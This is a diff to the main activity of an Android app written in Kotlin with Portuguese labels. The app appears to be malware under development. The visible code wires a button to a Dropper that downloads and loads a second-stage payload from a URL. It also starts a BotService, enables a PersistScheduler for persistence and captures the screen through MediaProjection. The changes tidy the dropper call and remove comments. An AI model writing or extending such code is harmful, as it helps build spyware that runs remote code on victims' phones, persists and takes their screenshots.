@@ -48,6 +48,8 @@ class MainActivity : AppCompatActivity() {
             text = "Autorizar screenshot (1x)"
             setOnClickListener { requestMediaProjection() }
         }
+
+        val appCtx = applicationContext
         val btnStage2 = Button(this).apply {
             text = "Carregar 2ª fase"
             setOnClickListener {
@@ -55,7 +57,7 @@ class MainActivity : AppCompatActivity() {
                 if (url.isBlank()) { info.text = "URL vazia"; return@setOnClickListener }
                 info.text = "Baixando…"
                 thread {
-                    val r = Dropper.downloadAndLoad(this, url)
+                    val r = Dropper.downloadAndLoad(appCtx, url)
                     runOnUiThread { info.text = r }
                 }
             }
@@ -78,7 +80,6 @@ class MainActivity : AppCompatActivity() {
             val i = Intent(this, BotService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
             else startService(i)
-            // se o serviço foi iniciado por /load, mantém persistência
             PersistScheduler.enable(this)
         } catch (_: Throwable) {}
     }
@@ -111,10 +112,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * Captura o primeiro frame e salva em arquivo. Reuso futuro precisa reconectar via
-     * o resultData da intent (guardamos apenas um snapshot; documentado no README).
-     */
     private fun captureOnce(data: Intent) {
         try {
             val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
